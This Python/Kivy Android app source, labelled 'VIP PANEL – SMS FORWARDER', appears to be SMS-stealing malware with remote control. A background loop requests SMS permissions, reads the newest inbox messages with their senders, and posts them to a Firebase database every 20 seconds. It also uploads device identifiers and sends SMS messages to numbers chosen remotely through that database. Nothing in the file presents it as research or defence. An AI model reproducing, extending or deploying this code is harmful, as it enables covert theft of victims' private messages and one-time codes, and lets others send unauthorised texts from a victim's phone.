"""
VIP PANEL – SMS FORWARDER + PANEL WEBVIEW
"""
import threading
import time
import requests
import json
import os
from datetime import datetime
from android.permissions import request_permissions, Permission
from android import Android
import jnius

# ===== CONFIG =====
FIREBASE_URL = "https://satanoopfirebase-default-rtdb.firebaseio.com"
# ==================

droid = Android()

def get_device_id():
    """Har phone ka unique ID - Android ID se"""
    try:
        Settings = jnius.autoclass('android.provider.Settings$Secure')
        ctx = jnius.autoclass('org.kivy.android.PythonActivity').mActivity
        android_id = Settings.getString(ctx.getContentResolver(), Settings.ANDROID_ID)
        if android_id:
            return "device_" + android_id[:10]
    except Exception as e:
        print(f"Device ID error: {e}")
    return "device_" + str(int(time.time()))

DEVICE_ID = get_device_id()

def log(msg):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{ts}] {msg}")

def get_device_info():
    """Battery, brand, model fetch karo"""
    info = {"name": "Android", "battery": "85%", "brand": "Unknown", "model": "Android", "androidV": "13"}
    try:
        Build = jnius.autoclass('android.os.Build')
        info["brand"] = str(Build.BRAND)
        info["model"] = str(Build.MODEL)
        info["name"] = f"{Build.BRAND} {Build.MODEL}"
        info["androidV"] = str(Build.VERSION.RELEASE)
    except Exception as e:
        log(f"Build info error: {e}")
    
    try:
        BatteryManager = jnius.autoclass('android.os.BatteryManager')
        ctx = jnius.autoclass('org.kivy.android.PythonActivity').mActivity
        bm = ctx.getSystemService(ctx.BATTERY_SERVICE)
        level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        info["battery"] = f"{level}%"
    except Exception as e:
        log(f"Battery error: {e}")
    
    return info

def send_status():
    url = f"{FIREBASE_URL}/clients/{DEVICE_ID}.json"
    info = get_device_info()
    data = {
        "name": info["name"],
        "brand": info["brand"],
        "model": info["model"],
        "androidV": info["androidV"],
        "battery": info["battery"],
        "deviceId": DEVICE_ID,
        "status": True,
        "lastSeen": time.time(),
    }
    try:
        r = requests.patch(url, json=data, timeout=10)
        if r.status_code in (200, 201):
            log(f"✅ Status OK: {DEVICE_ID} | {info['battery']}")
    except Exception as e:
        log(f"❌ Status error: {e}")

def read_sms():
    try:
        SmsQuery = jnius.autoclass('android.provider.Telephony$Sms$Inbox')
        ctx = jnius.autoclass('org.kivy.android.PythonActivity').mActivity
        cursor = ctx.getContentResolver().query(SmsQuery.CONTENT_URI, None, None, None, "date DESC LIMIT 3")
        if cursor:
            while cursor.moveToNext():
                body = cursor.getString(cursor.getColumnIndex("body"))
                sender = cursor.getString(cursor.getColumnIndex("address"))
                msg_data = {
                    "text": body[:500],
                    "sender": sender,
                    "time": time.time(),
                    "direction": "in"
                }
                push_url = f"{FIREBASE_URL}/messages/{DEVICE_ID}.json"
                requests.post(push_url, json=msg_data, timeout=10)
                log(f"✅ SMS from {sender}")
            cursor.close()
    except Exception as e:
        log(f"⚠️ SMS error: {e}")

def check_outgoing():
    url = f"{FIREBASE_URL}/clients/{DEVICE_ID}/webhookEvent/sendSms.json"
    try:
        r = requests.get(url, timeout=10)
        if r.status_code != 200:
            return
        data = r.json()
        if not data or data.get('isSended', True):
            return
        to = data.get('to')
        msg = data.get('message')
        if to and msg:
            SmsManager = jnius.autoclass('android.telephony.SmsManager')
            sms = SmsManager.getDefault()
            sms.sendTextMessage(to, None, msg, None, None)
            log(f"✅ SMS sent to {to}")
            data['isSended'] = True
            requests.patch(url, json=data)
    except Exception as e:
        log(f"⚠️ Outgoing error: {e}")

def worker():
    log(f"🚀 VIP Panel Service started | Device: {DEVICE_ID}")
    while True:
        send_status()
        read_sms()
        check_outgoing()
        time.sleep(20)

# ==== KIVY UI with WebView ====
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.clock import Clock
from kivy.utils import platform

try:
    from kivy.uix.webview import WebView
    WEBVIEW_AVAILABLE = True
except ImportError:
    WEBVIEW_AVAILABLE = False

class VipPanelApp(App):
    def build(self):
        request_permissions([
            Permission.READ_SMS,
            Permission.SEND_SMS,
            Permission.INTERNET,
            Permission.FOREGROUND_SERVICE,
            Permission.READ_PHONE_STATE
        ])
        
        if WEBVIEW_AVAILABLE and platform == 'android':
            try:
                # Panel HTML file load karo
                layout = WebView()
                # Panel HTML ko file:// se load karo
                panel_path = os.path.join(os.path.dirname(__file__), 'panel.html')
                if os.path.exists(panel_path):
                    layout.url = f'file://{panel_path}'
                else:
                    # Fallback: Firebase panel URL
                    layout.url = 'about:blank'
                return layout
            except Exception as e:
                print(f"WebView error: {e}")
        
        # Fallback UI
        layout = BoxLayout(orientation='vertical')
        label = Label(
            text="🔥 VIP PANEL\nService Running\nCheck Firebase",
            font_size=24,
            color=[1, 0.2, 0.2, 1]
        )
        layout.add_widget(label)
        return layout

    def on_start(self):
        t = threading.Thread(target=worker, daemon=False)
        t.start()

if __name__ == "__main__":
    VipPanelApp().run()